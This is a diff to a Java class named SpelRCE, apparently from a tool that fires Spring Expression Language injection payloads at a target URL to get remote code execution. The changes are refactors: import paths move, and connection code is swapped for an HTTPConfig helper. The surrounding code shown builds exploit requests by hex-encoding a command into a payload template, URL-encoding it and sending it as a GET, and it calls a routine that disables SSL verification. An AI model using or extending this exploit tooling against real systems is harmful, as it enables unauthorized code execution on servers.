@@ -1,5 +1,6 @@
 package src.main.module;
 
+import src.main.common.HTTPConfig;
 import src.main.impl.ResultCallback;
 
 import java.io.BufferedReader;
@@ -13,7 +14,7 @@ import java.util.Base64;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
-import static src.main.SSLVerify.sslVer.disableSSLVerification;
+import static src.main.ssl.sslVer.disableSSLVerification;
 
 public class SpelRCE {
     private String address;
@@ -63,13 +64,12 @@ public class SpelRCE {
         if (hexString.length() > 0) {
             hexString.setLength(hexString.length() - 1);
         }
-        String expdata = String.format(expDatatemp,hexString.toString());
+        String expdata = String.format(expDatatemp,hexString);
         String encodedExpData = URLEncoder.encode(expdata, StandardCharsets.UTF_8.toString());
         String updatedUrl = address +  "=" + encodedExpData;
 
             try {
-                URL obj = new URL(updatedUrl);
-                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+                HttpURLConnection conn = HTTPConfig.createConnection(updatedUrl);
                 conn.setRequestMethod("GET");
                 conn.setDoOutput(true);
                 int responseCode = conn.getResponseCode();
@@ -115,8 +115,7 @@ public class SpelRCE {
             }
             String updatedUrl = replaceInjectionPoints(address, paramName, pocData);
             try {
-                URL obj = new URL(updatedUrl);
-                HttpURLConnection conn = (HttpURLConnection) obj.openConnection();
+                HttpURLConnection conn = HTTPConfig.createConnection(updatedUrl);
                 conn.setRequestMethod("GET");
                 conn.setDoOutput(true);
                 int responseCode = conn.getResponseCode();
